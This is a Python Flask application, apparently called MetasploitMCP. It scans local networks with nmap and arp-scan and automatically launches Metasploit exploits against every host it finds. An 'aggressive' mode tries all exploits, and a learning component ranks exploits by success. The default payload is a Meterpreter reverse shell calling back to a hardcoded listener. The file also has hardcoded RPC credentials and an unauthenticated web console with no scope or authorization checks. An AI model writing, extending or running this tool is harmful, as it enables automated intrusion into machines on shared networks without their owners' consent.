# Paste the entire code above here#!/usr/bin/env python3
"""
MetasploitMCP API with AI Learning and Automated Attack System
Complete integration with automated exploitation campaigns
"""

from flask import Flask, jsonify, request
import nmap
import msgpack
import requests
import subprocess
import re
import os
import logging
import ipaddress
import time
from datetime import datetime

# Import AI and automation modules
from ai_learning_module import PenetrationTestingAI
from automated_attack_system import AutomatedAttackSystem

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)

app = Flask(__name__)

# Initialize AI learning system
ai = PenetrationTestingAI("metasploit_ai_knowledge.json")

# Initialize automated attack system
def msf_exploit_executor(mac, exploit_name, payload):
    """Real exploit executor using Metasploit RPC"""
    target = next((t for t in targets if t["mac"].lower() == mac.lower()), None)
    if not target:
        return False, "Target not found"
    
    ip = target["ip"]
    url = "http://127.0.0.1:55553/api/"
    headers = {"Content-Type": "binary/message-pack"}
    
    def msf_call(method, params):
        payload_data = msgpack.packb({"method": method, "params": params})
        response = requests.post(url, data=payload_data, headers=headers)
        return msgpack.unpackb(response.content, strict_map_key=False)
    
    try:
        auth = msf_call("auth.login", ["msf", "kali"])
        token = auth.get("token")
    except Exception as e:
        return False, f"Auth failed: {str(e)}"
    
    exploit_params = {
        "RHOSTS": ip,
        "PAYLOAD": payload,
        "LHOST": "10.0.0.216",
        "LPORT": 4444
    }
    
    try:
        result = msf_call("module.execute", [token, "exploit", exploit_name, exploit_params])
        return True, None
    except Exception as e:
        return False, str(e)

attack_system = AutomatedAttackSystem(ai, msf_exploit_executor)

@app.route('/')
def index():
    ai_stats = ai.get_statistics()
    exploit_info = attack_system.get_exploit_database_info()
    
    return jsonify({
        "status": "online",
        "service": "MetasploitMCP API with AI Learning & Automated Attacks",
        "ai_enabled": True,
        "automated_attacks_enabled": True,
        "ai_statistics": ai_stats,
        "exploit_database": exploit_info,
        "endpoints": {
            "/list_targets": "GET - List network targets",
            "/launch": "POST - Launch single exploit",
            "/auto_attack/start": "POST - Start automated campaign",
            "/auto_attack/status/<id>": "GET - Get campaign status",
            "/auto_attack/results/<id>": "GET - Get campaign results",
            "/auto_attack/stop/<id>": "POST - Stop campaign",
            "/auto_attack/list": "GET - List all campaigns",
            "/ai/recommend": "POST - Get AI recommendations",
            "/ai/stats": "GET - AI statistics",
            "/console": "GET - Web console interface"
        }
    })

@app.route('/console')
def console():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>MetasploitMCP Console - Automated Attacks</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Courier New', monospace; 
                background: #0a0a0a; 
                color: #00ff00; 
                padding: 20px;
            }
            .container { max-width: 1800px; margin: 0 auto; }
            h1 { 
                color: #00ff00; 
                text-align: center; 
                margin-bottom: 20px;
                text-shadow: 0 0 10px #00ff00;
            }
            .panel-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 15px;
                margin-bottom: 20px;
            }
            .panel {
                background: #1a1a1a;
                border: 2px solid #00ff00;
                border-radius: 5px;
                padding: 15px;
            }
            .panel h2 {
                color: #00ff00;
                margin-bottom: 10px;
                font-size: 18px;
                border-bottom: 1px solid #00ff00;
                padding-bottom: 5px;
            }
            button {
                background: #00ff00;
                color: #000;
                padding: 8px 15px;
                margin: 5px 5px 5px 0;
                border: none;
                cursor: pointer;
                font-family: 'Courier New', monospace;
                font-weight: bold;
                border-radius: 3px;
            }
            button:hover { background: #00cc00; }
            button:active { background: #009900; }
            button.danger { background: #ff3333; color: #fff; }
            button.danger:hover { background: #cc0000; }
            button.auto { background: #ff9900; color: #000; }
            button.auto:hover { background: #ff7700; }
            #output {
                background: #000;
                padding: 20px;
                border: 2px solid #00ff00;
                min-height: 400px;
                max-height: 600px;
                overflow-y: auto;
                margin-top: 20px;
                font-size: 13px;
                line-height: 1.4;
            }
            .progress-bar {
                width: 100%;
                height: 25px;
                background: #1a1a1a;
                border: 1px solid #00ff00;
                border-radius: 3px;
                margin: 10px 0;
                overflow: hidden;
            }
            .progress-fill {
                height: 100%;
                background: linear-gradient(90deg, #00ff00, #00cc00);
                transition: width 0.3s;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #000;
                font-weight: bold;
            }
            select, input {
                background: #1a1a1a;
                color: #00ff00;
                border: 1px solid #00ff00;
                padding: 8px;
                margin: 5px 0;
                width: 100%;
                font-family: 'Courier New', monospace;
            }
            .campaign-status {
                background: #1a3a1a;
                padding: 10px;
                margin: 5px 0;
                border-left: 3px solid #00ff00;
            }
            .log-entry { margin: 3px 0; }
            .log-info { color: #00ccff; }
            .log-success { color: #00ff00; }
            .log-error { color: #ff3333; }
            .log-warning { color: #ffaa00; }
            .checkbox-label {
                display: flex;
                align-items: center;
                margin: 10px 0;
                cursor: pointer;
            }
            input[type="checkbox"] {
                width: auto;
                margin-right: 10px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 MetasploitMCP - Automated Attack Console</h1>
            
            <div class="panel-grid">
                <!-- Network Scanning -->
                <div class="panel">
                    <h2>📡 Network Scanning</h2>
                    <button onclick="scanTargets()">Scan Network</button>
                    <button onclick="showTargets()">Show Targets</button>
                </div>
                
                <!-- Target Selection -->
                <div class="panel">
                    <h2>🎯 Target Selection</h2>
                    <select id="targetSelect">
                        <option value="">-- Select Target --</option>
                    </select>
                    <div id="targetInfo" style="margin-top: 10px; font-size: 12px;"></div>
                </div>
                
                <!-- Automated Attack -->
                <div class="panel">
                    <h2>🤖 Automated Attack</h2>
                    <label class="checkbox-label">
                        <input type="checkbox" id="aggressiveMode">
                        <span>Aggressive Mode (Try all exploits)</span>
                    </label>
                    <button class="auto" onclick="startAutomatedAttack()">🚀 Launch Auto Attack</button>
                    <button onclick="stopCurrentCampaign()">⏹️ Stop Campaign</button>
                </div>
                
                <!-- Campaign Status -->
                <div class="panel">
                    <h2>📊 Campaign Status</h2>
                    <div id="campaignStatus" style="font-size: 12px;">
                        No active campaigns
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressBar" style="width: 0%">0%</div>
                    </div>
                </div>
                
                <!-- AI Recommendations -->
                <div class="panel">
                    <h2>🧠 AI Recommendations</h2>
                    <button onclick="getAIRecommendations()">Get Recommendations</button>
                    <button onclick="showAIStats()">AI Statistics</button>
                </div>
                
                <!-- Campaign Management -->
                <div class="panel">
                    <h2>📋 Campaign Management</h2>
                    <button onclick="listAllCampaigns()">List All Campaigns</button>
                    <button onclick="showCampaignResults()">Show Results</button>
                </div>
            </div>
            
            <!-- Main Output Console -->
            <div id="output">
                <div class="log-success">═══════════════════════════════════════════════════════</div>
                <div class="log-success">  MetasploitMCP Automated Attack Console</div>
                <div class="log-success">  AI-Powered Exploitation Framework</div>
                <div class="log-success">═══════════════════════════════════════════════════════</div>
                <div class="log-info">Ready. Scan network and select a target to begin.</div>
            </div>
        </div>
        
        <script>
            let targets = [];
            let currentCampaignId = null;
            let statusUpdateInterval = null;
            
            function log(message, type = 'info') {
                const output = document.getElementById('output');
                const timestamp = new Date().toLocaleTimeString();
                const className = 'log-' + type;
                output.innerHTML += `<div class="log-entry ${className}">[${timestamp}] ${message}</div>`;
                output.scrollTop = output.scrollHeight;
            }
            
            async function scanTargets() {
                log('🔍 Initiating network scan...', 'info');
                log('⏳ Please wait...', 'warning');
                
                try {
                    const response = await fetch('/list_targets');
                    const data = await response.json();
                    targets = data.targets || [];
                    
                    log(`✓ Scan complete. Found ${targets.length} targets`, 'success');
                    updateTargetSelect();
                    
                    if (data.ai_stats) {
                        log(`AI: ${data.ai_stats.targets_profiled} targets profiled`, 'info');
                    }
                } catch (error) {
                    log('✗ Scan failed: ' + error.message, 'error');
                }
            }
            
            function updateTargetSelect() {
                const select = document.getElementById('targetSelect');
                select.innerHTML = '<option value="">-- Select Target --</option>';
                
                targets.forEach(target => {
                    const option = document.createElement('option');
                    option.value = JSON.stringify({mac: target.mac, ip: target.ip, os: target.os_guess});
                    option.textContent = `${target.ip} - ${target.vendor || 'Unknown'} (${target.os_guess || 'Unknown OS'})`;
                    select.appendChild(option);
                });
                
                select.onchange = function() {
                    if (this.value) {
                        const target = JSON.parse(this.value);
                        document.getElementById('targetInfo').innerHTML = 
                            `IP: ${target.ip}<br>MAC: ${target.mac}<br>OS: ${target.os}`;
                    }
                };
            }
            
            function showTargets() {
                if (targets.length === 0) {
                    log('No targets available. Run a scan first.', 'warning');
                    return;
                }
                
                log('═══ DISCOVERED TARGETS ═══', 'success');
                targets.forEach((target, i) => {
                    log(`[${i+1}] ${target.ip} (${target.mac}) - ${target.vendor || 'Unknown'} - ${target.os_guess || 'Unknown OS'}`, 'info');
                });
            }
            
            async function startAutomatedAttack() {
                const targetSelect = document.getElementById('targetSelect');
                if (!targetSelect.value) {
                    log('✗ Please select a target first', 'error');
                    return;
                }
                
                const target = JSON.parse(targetSelect.value);
                const aggressive = document.getElementById('aggressiveMode').checked;
                
                if (!confirm(`🚀 Launch automated attack against ${target.ip}?\\n\\nMode: ${aggressive ? 'AGGRESSIVE (all exploits)' : 'SMART (AI-guided)'}\\n\\nThis will run multiple exploits automatically.`)) {
                    return;
                }
                
                log('═══ AUTOMATED ATTACK INITIATED ═══', 'warning');
                log(`Target: ${target.ip} (${target.mac})`, 'info');
                log(`OS: ${target.os}`, 'info');
                log(`Mode: ${aggressive ? 'Aggressive' : 'Smart AI-guided'}`, 'info');
                log('⏳ Starting campaign...', 'warning');
                
                try {
                    const response = await fetch('/auto_attack/start', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            mac: target.mac,
                            ip: target.ip,
                            os_guess: target.os,
                            aggressive: aggressive
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (response.ok) {
                        currentCampaignId = data.campaign_id;
                        log(`✓ Campaign started: ${currentCampaignId}`, 'success');
                        log('📊 Monitoring progress...', 'info');
                        
                        // Start monitoring
                        startStatusMonitoring();
                    } else {
                        log('✗ Failed to start campaign: ' + (data.error || 'Unknown error'), 'error');
                    }
                } catch (error) {
                    log('✗ Error: ' + error.message, 'error');
                }
            }
            
            function startStatusMonitoring() {
                if (statusUpdateInterval) {
                    clearInterval(statusUpdateInterval);
                }
                
                statusUpdateInterval = setInterval(async () => {
                    if (!currentCampaignId) return;
                    
                    try {
                        const response = await fetch(`/auto_attack/status/${currentCampaignId}`);
                        const status = await response.json();
                        
                        if (response.ok) {
                            updateCampaignDisplay(status);
                            
                            if (status.status === 'completed' || status.status === 'stopped') {
                                clearInterval(statusUpdateInterval);
                                log(`═══ CAMPAIGN ${status.status.toUpperCase()} ═══`, 'success');
                                log(`Successful: ${status.successful}/${status.total}`, 'success');
                                log(`Failed: ${status.failed}`, 'warning');
                                log(`Skipped: ${status.skipped}`, 'info');
                                showCampaignResults();
                            }
                        }
                    } catch (error) {
                        console.error('Status update error:', error);
                    }
                }, 2000);
            }
            
            function updateCampaignDisplay(status) {
                const statusDiv = document.getElementById('campaignStatus');
                const progressBar = document.getElementById('progressBar');
                
                statusDiv.innerHTML = `
                    <div>Campaign: ${status.campaign_id.substring(0, 20)}...</div>
                    <div>Status: ${status.status.toUpperCase()}</div>
                    <div>Progress: ${status.completed}/${status.total} exploits</div>
                    <div>✓ Success: ${status.successful} | ✗ Failed: ${status.failed} | ⊘ Skipped: ${status.skipped}</div>
                    <div>Current: ${status.current_exploit || 'None'}</div>
                `;
                
                progressBar.style.width = status.progress + '%';
                progressBar.textContent = Math.round(status.progress) + '%';
                
                if (status.successful > 0) {
                    progressBar.style.background = 'linear-gradient(90deg, #00ff00, #00cc00)';
                } else if (status.completed > status.total / 2) {
                    progressBar.style.background = 'linear-gradient(90deg, #ffaa00, #ff9900)';
                }
            }
            
            async function stopCurrentCampaign() {
                if (!currentCampaignId) {
                    log('No active campaign to stop', 'warning');
                    return;
                }
                
                if (!confirm('Stop the current campaign?')) return;
                
                try {
                    const response = await fetch(`/auto_attack/stop/${currentCampaignId}`, {
                        method: 'POST'
                    });
                    
                    if (response.ok) {
                        log('✓ Campaign stopped', 'success');
                        clearInterval(statusUpdateInterval);
                    }
                } catch (error) {
                    log('✗ Error stopping campaign: ' + error.message, 'error');
                }
            }
            
            async function showCampaignResults() {
                if (!currentCampaignId) {
                    log('No campaign selected', 'warning');
                    return;
                }
                
                try {
                    const response = await fetch(`/auto_attack/results/${currentCampaignId}`);
                    const results = await response.json();
                    
                    if (response.ok) {
                        log('═══ CAMPAIGN RESULTS ═══', 'success');
                        log(`Campaign ID: ${results.id}`, 'info');
                        log(`Target: ${results.target_ip} (${results.target_mac})`, 'info');
                        log(`Duration: ${results.start_time} to ${results.end_time || 'ongoing'}`, 'info');
                        log(`Total Exploits: ${results.total_exploits}`, 'info');
                        log(`Successful: ${results.successful_exploits}`, 'success');
                        log(`Failed: ${results.failed_exploits}`, 'warning');
                        log(`Skipped: ${results.skipped_exploits}`, 'info');
                        
                        log('Detailed Results:', 'info');
                        results.results.forEach((r, i) => {
                            const status = r.status === 'success' ? '✓' : r.status === 'skipped' ? '⊘' : '✗';
                            const type = r.status === 'success' ? 'success' : r.status === 'skipped' ? 'info' : 'warning';
                            log(`${status} ${r.exploit} (${r.payload || 'N/A'})`, type);
                        });
                    }
                } catch (error) {
                    log('✗ Error fetching results: ' + error.message, 'error');
                }
            }
            
            async function getAIRecommendations() {
                const targetSelect = document.getElementById('targetSelect');
                if (!targetSelect.value) {
                    log('✗ Please select a target first', 'error');
                    return;
                }
                
                const target = JSON.parse(targetSelect.value);
                
                try {
                    const response = await fetch('/ai/recommend', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({mac: target.mac})
                    });
                    
                    const data = await response.json();
                    
                    if (response.ok && data.recommended_exploit) {
                        log('═══ AI RECOMMENDATIONS ═══', 'success');
                        log(`Recommended Exploit: ${data.recommended_exploit}`, 'success');
                        log(`Success Rate: ${(data.exploit_success_rate * 100).toFixed(1)}%`, 'info');
                        log(`Based on: ${data.exploit_attempts} previous attempts`, 'info');
                        log(`Recommended Payload: ${data.recommended_payload || 'N/A'}`, 'info');
                        log(`Confidence: ${data.ai_confidence.toUpperCase()}`, 'info');
                    } else {
                        log('No AI recommendations available yet', 'warning');
                        log('The AI needs more data. Try running some exploits first.', 'info');
                    }
                } catch (error) {
                    log('✗ Error: ' + error.message, 'error');
                }
            }
            
            async function showAIStats() {
                try {
                    const response = await fetch('/ai/stats');
                    const stats = await response.json();
                    
                    log('═══ AI LEARNING STATISTICS ═══', 'success');
                    log(`Total Operations: ${stats.total_operations}`, 'info');
                    log(`Successful: ${stats.successful_operations}`, 'success');
                    log(`Success Rate: ${(stats.success_rate * 100).toFixed(1)}%`, 'info');
                    log(`Targets Profiled: ${stats.targets_profiled}`, 'info');
                    log(`Exploits Learned: ${stats.exploits_learned}`, 'info');
                    log(`Payloads Learned: ${stats.payloads_learned}`, 'info');
                    log(`Patterns Discovered: ${stats.patterns_discovered}`, 'info');
                } catch (error) {
                    log('✗ Error: ' + error.message, 'error');
                }
            }
            
            async function listAllCampaigns() {
                try {
                    const response = await fetch('/auto_attack/list');
                    const data = await response.json();
                    
                    if (data.campaigns.length === 0) {
                        log('No campaigns found', 'warning');
                        return;
                    }
                    
                    log('═══ ALL CAMPAIGNS ═══', 'success');
                    data.campaigns.forEach(c => {
                        log(`${c.campaign_id.substring(0, 20)}... - ${c.status} (${c.progress.toFixed(1)}%)`, 'info');
                    });
                } catch (error) {
                    log('✗ Error: ' + error.message, 'error');
                }
            }
            
            log('Console initialized. Ready for operations.', 'success');
            log('Tip: Start by scanning the network, then select a target', 'info');
        </script>
    </body>
    </html>
    '''

targets = []

def get_local_ipv4s():
    """Get all local IPv4 addresses"""
    try:
        out = subprocess.check_output(["ip", "-4", "addr", "show"]).decode()
        return set(re.findall(r'inet\s+(\d+\.\d+\.\d+\.\d+)', out))
    except Exception as e:
        log.error(f"Failed to get local IPs: {e}")
        return set()

def get_iface_networks(selected_ifaces=None):
    """Get network ranges for specified interfaces"""
    result = []
    try:
        out = subprocess.check_output(["ip", "-4", "addr", "show"]).decode()
        lines = out.split("\n")
        current_iface = None
        for line in lines:
            if re.match(r"^\d+:\s+\w+", line):
                parts = line.split(":")
                if len(parts) >= 2:
                    current_iface = parts[1].strip()
            if "inet " in line and current_iface:
                match = re.search(r'inet\s+([\d\.]+)/(\d+)', line)
                if match:
                    ip_str = match.group(1)
                    prefix = int(match.group(2))
                    if ip_str.startswith("127."):
                        continue
                    if selected_ifaces and current_iface not in selected_ifaces:
                        continue
                    network = ipaddress.IPv4Network(f"{ip_str}/{prefix}", strict=False)
                    result.append((current_iface, str(network)))
    except Exception as e:
        log.error(f"Failed to get interface networks: {e}")
    
    return result

def run_nmap_scan(iface, network):
    """Run nmap scan using sudo"""
    log.info(f"Running nmap on {iface} ({network})")
    hosts_data = []
    
    try:
        # Use direct subprocess call with sudo
        cmd = ["sudo", "nmap", "-sn", "-PR", "-e", iface, network]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        if result.returncode == 0:
            log.info(f"nmap scan successful, parsing output...")
            # Parse nmap output
            lines = result.stdout.split("\n")
            for line in lines:
                # Look for "Nmap scan report for" lines
                if "Nmap scan report for" in line:
                    # Extract IP
                    ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    if ip_match:
                        ip = ip_match.group(1)
                        # Look for MAC in next lines
                        try:
                            idx = lines.index(line)
                            mac = ""
                            vendor = ""
                            for i in range(idx, min(idx + 5, len(lines))):
                                mac_match = re.search(r'MAC Address: ([0-9A-Fa-f:]+) \(([^)]+)\)', lines[i])
                                if mac_match:
                                    mac = mac_match.group(1)
                                    vendor = mac_match.group(2)
                                    break
                            
                            if mac:
                                os_guess = "Unknown"
                                vendor_lower = vendor.lower()
                                if any(x in vendor_lower for x in ["apple", "mac"]):
                                    os_guess = "macOS"
                                elif any(x in vendor_lower for x in ["microsoft", "dell", "hp", "lenovo", "asus"]):
                                    os_guess = "Windows"
                                elif any(x in vendor_lower for x in ["raspberry", "linux", "debian", "ubuntu"]):
                                    os_guess = "Linux"
                                
                                hosts_data.append({
                                    "ip": ip,
                                    "mac": mac,
                                    "hostname": "",
                                    "vendor": vendor,
                                    "os_guess": os_guess
                                })
                                log.info(f"Found: {ip} ({mac}) - {vendor}")
                        except Exception as e:
                            log.warning(f"Error processing line: {e}")
                            continue
        else:
            log.error(f"nmap failed: {result.stderr}")
    except Exception as e:
        log.error(f"nmap scan failed for {network} on {iface}: {e}")
    
    return hosts_data

def run_arp_scan(iface):
    """Fallback ARP scan using arp-scan tool"""
    hosts_data = []
    try:
        result = subprocess.run(
            ["sudo", "arp-scan", "-l", "-e", iface],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.returncode == 0:
            lines = result.stdout.split("\n")
            for line in lines:
                if line and not line.startswith("Interface") and "\t" in line:
                    parts = line.split("\t")
                    if len(parts) >= 2:
                        ip = parts[0].strip()
                        mac = parts[1].strip()
                        vendor = parts[2].strip() if len(parts) > 2 else ""
                        
                        os_guess = "Unknown"
                        vendor_lower = vendor.lower()
                        if any(x in vendor_lower for x in ["apple", "mac"]):
                            os_guess = "macOS"
                        elif any(x in vendor_lower for x in ["microsoft", "dell", "hp", "lenovo"]):
                            os_guess = "Windows"
                        elif any(x in vendor_lower for x in ["linux", "raspberry"]):
                            os_guess = "Linux"
                        
                        hosts_data.append({
                            "ip": ip,
                            "mac": mac,
                            "hostname": "",
                            "vendor": vendor,
                            "os_guess": os_guess
                        })
                        log.info(f"ARP Found: {ip} ({mac}) - {vendor}")
    except Exception as e:
        log.error(f"arp-scan failed: {e}")
    
    return hosts_data

@app.route("/list_targets")
def list_targets():
    """Scan network and return discovered targets"""
    global targets
    targets = []
    start_time = time.time()
    
    selected_ifaces = ["wlan0", "wlan1", "eth0", "eth1"]
    iface_nets = get_iface_networks(selected_ifaces)
    
    if not iface_nets:
        log.warning("No suitable network interfaces found")
        return jsonify({
            "targets": [],
            "scan_time": 0,
            "error": "No network interfaces found",
            "ai_stats": ai.get_statistics()
        })
    
    all_hosts = []
    for (iface, network) in iface_nets:
        discovered = run_nmap_scan(iface, network)
        all_hosts.extend(discovered)
    
    local_ips = get_local_ipv4s()
    
    for host in all_hosts:
        if not host["mac"] or host["ip"] in local_ips:
            continue
        
        # Avoid duplicates
        if any(t["mac"].lower() == host["mac"].lower() for t in targets):
            continue
        
        targets.append(host)
        ai.update_target_profile(
            mac=host["mac"],
            ip=host["ip"],
            hostname=host["hostname"],
            vendor=host["vendor"],
            os_guess=host.get("os_guess")
        )
    
    scan_time = time.time() - start_time
    log.info(f"Scan completed in {scan_time:.2f}s, found {len(targets)} targets")
    
    return jsonify({
        "targets": targets,
        "scan_time": scan_time,
        "ai_stats": ai.get_statistics()
    })

# Automated Attack Endpoints
@app.route("/auto_attack/start", methods=["POST"])
def start_auto_attack():
    data = request.get_json(force=True)
    mac = data.get("mac")
    ip = data.get("ip")
    os_guess = data.get("os_guess", "Unknown")
    aggressive = data.get("aggressive", False)
    
    if not mac or not ip:
        return jsonify({"error": "MAC and IP required"}), 400
    
    campaign_id = attack_system.start_automated_campaign(
        target_mac=mac,
        target_ip=ip,
        os_guess=os_guess,
        aggressive=aggressive
    )
    
    return jsonify({
        "campaign_id": campaign_id,
        "status": "started",
        "message": f"Automated campaign started against {ip}"
    })

@app.route("/auto_attack/status/<campaign_id>")
def get_attack_status(campaign_id):
    status = attack_system.get_campaign_status(campaign_id)
    if not status:
        return jsonify({"error": "Campaign not found"}), 404
    return jsonify(status)

@app.route("/auto_attack/results/<campaign_id>")
def get_attack_results(campaign_id):
    results = attack_system.get_campaign_results(campaign_id)
    if not results:
        return jsonify({"error": "Campaign not found"}), 404
    return jsonify(results)

@app.route("/auto_attack/stop/<campaign_id>", methods=["POST"])
def stop_attack(campaign_id):
    if attack_system.stop_campaign(campaign_id):
        return jsonify({"message": "Campaign stopped"})
    return jsonify({"error": "Campaign not found or already stopped"}), 404

@app.route("/auto_attack/list")
def list_campaigns():
    campaigns = attack_system.list_active_campaigns()
    return jsonify({"campaigns": campaigns})

@app.route("/auto_attack/exploits")
def list_exploits():
    info = attack_system.get_exploit_database_info()
    return jsonify(info)

# AI Endpoints
@app.route("/ai/recommend", methods=["POST"])
def ai_recommend():
    data = request.get_json(force=True)
    mac = data.get("mac")
    
    if not mac:
        return jsonify({"error": "MAC address required"}), 400
    
    exploit_rec = ai.recommend_exploit(mac)
    
    if not exploit_rec:
        return jsonify({
            "message": "No recommendations available yet",
            "suggestion": "Try running exploits to build knowledge base"
        })
    
    payload_rec = ai.recommend_payload(exploit_rec["exploit"])
    
    return jsonify({
        "target_mac": mac,
        "recommended_exploit": exploit_rec["exploit"],
        "exploit_success_rate": exploit_rec["success_rate"],
        "exploit_attempts": exploit_rec["attempts"],
        "recommended_payload": payload_rec,
        "ai_confidence": "high" if exploit_rec["success_rate"] > 0.7 else "medium"
    })

@app.route("/ai/stats")
def ai_stats():
    return jsonify(ai.get_statistics())

@app.route("/ai/report")
def ai_report():
    report = ai.export_knowledge_report()
    return f"<pre>{report}</pre>", 200, {'Content-Type': 'text/html'}

@app.route("/ai/reset", methods=["POST"])
def ai_reset():
    password = request.get_json(force=True).get("password")
    if password != "reset_ai_knowledge":
        return jsonify({"error": "Invalid password"}), 403
    
    global ai
    if os.path.exists("metasploit_ai_knowledge.json"):
        os.rename("metasploit_ai_knowledge.json", 
                 f"metasploit_ai_knowledge_backup_{int(time.time())}.json")
    ai = PenetrationTestingAI("metasploit_ai_knowledge.json")
    return jsonify({"message": "AI knowledge base reset successfully"})

# Manual single exploit endpoint (legacy support)
@app.route("/launch", methods=["POST"])
def launch_exploit():
    data = request.get_json(force=True)
    mac_input = data.get("mac")
    exploit_input = data.get("exploit", "multi/handler")
    payload_input = data.get("payload", "windows/meterpreter/reverse_tcp")
    
    if not mac_input:
        return jsonify({"error": "MAC address required"}), 400
    
    target = next((t for t in targets if t["mac"].lower() == mac_input.lower()), None)
    if not target:
        return jsonify({"error": "MAC address not found"}), 404
    
    ip = target["ip"]
    
    # Check AI recommendation
    if not ai.should_retry_exploit(exploit_input, mac_input):
        log.warning(f"AI recommends against {exploit_input} for {mac_input}")
        return jsonify({
            "error": "AI suggests low success probability",
            "recommendation": ai.recommend_exploit(mac_input)
        }), 400
    
    # Metasploit RPC
    url = "http://127.0.0.1:55553/api/"
    headers = {"Content-Type": "binary/message-pack"}
    
    def msf_call(method, params):
        payload = msgpack.packb({"method": method, "params": params})
        response = requests.post(url, data=payload, headers=headers)
        return msgpack.unpackb(response.content, strict_map_key=False)
    
    try:
        auth = msf_call("auth.login", ["msf", "kali"])
        token = auth.get("token")
    except Exception as e:
        log.error("Metasploit auth failed: %s", e)
        ai.record_exploit_attempt(exploit_input, payload_input, mac_input, 
                                 False, f"Auth failed: {str(e)}")
        return jsonify({"error": f"Metasploit auth failed: {str(e)}"}), 500
    
    exploit_params = {
        "RHOSTS": ip,
        "PAYLOAD": payload_input,
        "LHOST": "10.0.0.216",
        "LPORT": 4444
    }
    
    success = False
    error_msg = None
    result = None
    
    try:
        result = msf_call("module.execute", [token, "exploit", exploit_input, exploit_params])
        success = True
        log.info(f"Exploit successful against {ip}")
    except Exception as e:
        error_msg = str(e)
        log.error(f"Exploit execution failed: {e}")
    
    ai.record_exploit_attempt(
        exploit=exploit_input,
        payload=payload_input,
        target_mac=mac_input,
        success=success,
        error_msg=error_msg
    )
    
    if success:
        return jsonify({
            "result": result,
            "ai_stats": ai.get_statistics()
        })
    else:
        return jsonify({
            "error": f"Exploit failed: {error_msg}"
        }), 500

if __name__ == "__main__":
    log.info("Starting MetasploitMCP API with AI Learning and Automated Attacks...")
    log.info(f"AI Statistics: {ai.get_statistics()}")
    log.info(f"Exploit Database: {attack_system.get_exploit_database_info()}")
    app.run(debug=False, host="0.0.0.0", port=5000)
